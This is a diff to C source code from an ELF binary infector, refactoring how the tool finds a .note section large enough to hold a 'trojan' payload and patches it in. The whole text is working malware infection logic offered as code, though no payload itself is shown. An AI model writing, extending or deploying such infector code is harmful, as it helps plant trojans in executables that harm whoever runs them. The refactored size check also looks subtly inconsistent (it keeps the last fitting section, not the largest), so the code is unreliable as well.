@@ -75,22 +75,6 @@ static elf_off_t _inf_set_pad(infect_t *inf, elf_phdr_t *text, elf_phdr_t *data)
     return rv;
 }
 
-/** Find and return the larger SHT_NOTE section, if any */
-static elf_shdr_t *_inf_get_largest_note(infect_t *inf) {
-    elf_t *e = inf->elfo;
-    elf_xword_t max = 0;
-    elf_shdr_t *rv = NULL;
-
-    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr; ++i) {
-        int idx = e->shmap[LAZY_SHT_NOTE].map[i];
-        if (e->shdrs[idx]->sh_size > max) {
-            max = e->shdrs[idx]->sh_size;
-            rv = e->shdrs[idx];
-        }
-    }
-    return rv;
-}
-
 infect_t *inf_load(elf_t *elfo, open_mode_t m, long magic, struct mapped_file *map) {
     ASSERT_ARG_RET_NULL(elfo);
     ASSERT_CON_RET_NULL(m == F_RW);
@@ -198,23 +182,48 @@ bool inf_load_and_patch(infect_t *inf) {
     return true;
 }
 
-bool inf_note_patch(infect_t *inf) {
+/** Find and return the larger SHT_NOTE section, if any */
+static elf_shdr_t *_inf_get_largest_note(infect_t *inf, elf_word_t max) {
+    elf_t *e = inf->elfo;
+    elf_shdr_t *rv = NULL;
+
+    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr && !rv; ++i) {
+        int idx = e->shmap[LAZY_SHT_NOTE].map[i];
+        if (e->shdrs[idx]->sh_size == max)
+            rv = e->shdrs[idx];
+    }
+    return rv;
+}
+
+
+elf_xword_t inf_note_has_room_for_payload(infect_t *inf) {
+    elf_t *e = inf->elfo;
+    elf_xword_t max = 0;
+
+    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr; ++i) {
+        int idx = e->shmap[LAZY_SHT_NOTE].map[i];
+        if (e->shdrs[idx]->sh_size >= inf->trojan_size)
+            max = e->shdrs[idx]->sh_size;
+    }
+
+    if (!max)
+        log_info("Error: no space for trojan\n");
+
+    return max;
+}
+
+bool inf_note_patch(infect_t *inf, elf_xword_t max) {
     ASSERT_ARG_RET_FALSE(inf);
+    ASSERT_ARG_RET_FALSE(max > 0);
     ASSERT_CON_RET_FALSE(inf->elfo);
 
     /**
      * Find out if we have enough space for infection
      * in one of SHT_NOTE sections, if any
      */
-    elf_shdr_t *sht_note = _inf_get_largest_note(inf);
+    elf_shdr_t *sht_note = _inf_get_largest_note(inf, max);
     if (!sht_note) {
         log_error("Error: No available .note section\n");
-        return false;
-    }
-
-    if (sht_note->sh_size < inf->trojan_size) {
-        log_error("Error: no space for trojan (%d < %d)\n",
-                sht_note->sh_size, inf->trojan_size);
         return false;
     }
 
